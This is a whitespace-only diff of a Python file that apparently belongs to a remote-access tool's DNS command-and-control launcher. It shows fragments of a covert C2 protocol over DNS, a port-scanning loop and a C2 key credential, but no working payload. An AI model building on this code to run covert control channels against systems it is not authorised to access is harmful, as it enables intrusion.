@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 # Copyright (c) 2016, Oleksii Shevchuk (alxchk@gmail.com)
 
-__all__ = [ 'DNSCommandClientLauncher' ]
+__all__ = ['DNSCommandClientLauncher']
 
 from ..base_launcher import BaseLauncher, LauncherArgumentParser, LauncherError
 from ..picocmd.client import DnsCommandsClient
@@ -124,7 +124,7 @@ class DNSCommandClientLauncher(DnsCommandsClient):
         ports = xrange(port_start, port_end+1)
         connectable = scan([str(host)], ports)
         while connectable:
-            chunk = [ x[1] for x in connectable[:5] ]
+            chunk = [x[1] for x in connectable[:5]]
             connectable = connectable[5:]
             self.event(ConnectablePort(host, chunk))
 
@@ -191,7 +191,7 @@ class DNSCommandClientLauncher(DnsCommandsClient):
 class DNSCncLauncher(BaseLauncher):
     ''' Micro command protocol built over DNS infrastructure '''
 
-    credentials = [ 'DNSCNC_PUB_KEY_V2' ]
+    credentials = ['DNSCNC_PUB_KEY_V2']
 
     def __init__(self, *args, **kwargs):
         self.connect_on_bind_payload=kwargs.pop('connect_on_bind_payload', False)
